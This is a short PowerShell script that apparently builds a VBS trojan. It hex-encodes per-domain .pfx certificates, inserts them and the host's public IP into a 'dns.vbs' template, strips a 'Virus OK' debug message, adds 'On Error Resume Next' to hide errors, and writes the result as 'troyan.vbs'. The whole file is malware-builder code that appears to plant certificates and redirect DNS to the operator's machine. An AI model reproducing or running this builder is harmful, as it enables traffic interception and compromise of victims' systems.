$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$domainArray = Get-Content (Join-Path -Path $scriptDir -ChildPath "../domains.txt")
$publicInterface = (Get-NetRoute -DestinationPrefix 0.0.0.0/0 | Get-NetIPAddress | Where-Object {$_.AddressFamily -eq 'IPv4'}).IPAddress


function CreateEntry {
    param (
        [string]$domain
    )
    $pathPfx = Join-Path -Path $scriptDir -ChildPath "..\cert\$domain.pfx"
    $binaryData = Get-Content -Path $pathPfx -Encoding Byte -Raw
    $hexString = [BitConverter]::ToString($binaryData)
    return $hexString
}


$stringList = @()
foreach ($domain in $domainArray) {
    if (-not [string]::IsNullOrWhiteSpace($domain)) 
    {
       $code = CreateEntry -domain $domain
       $stringList += "`"$code`""
    }
}
$listString = $stringList -join ', '

$template = Get-Content (Join-Path -Path $scriptDir -ChildPath "./dns.vbs")

$template = $template -replace "1\.1\.1\.1", $publicInterface
$template  = $template -replace 'MsgBox "Virus OK"', ""
$template  = $template -replace "' Hello Moto", "On Error Resume Next"
$template  = $template -replace '"00","01"', $listString

$troyan = Join-Path -Path $scriptDir -ChildPath './troyan.vbs'

$template | Set-Content -Path $troyan

Write-Host 'Done'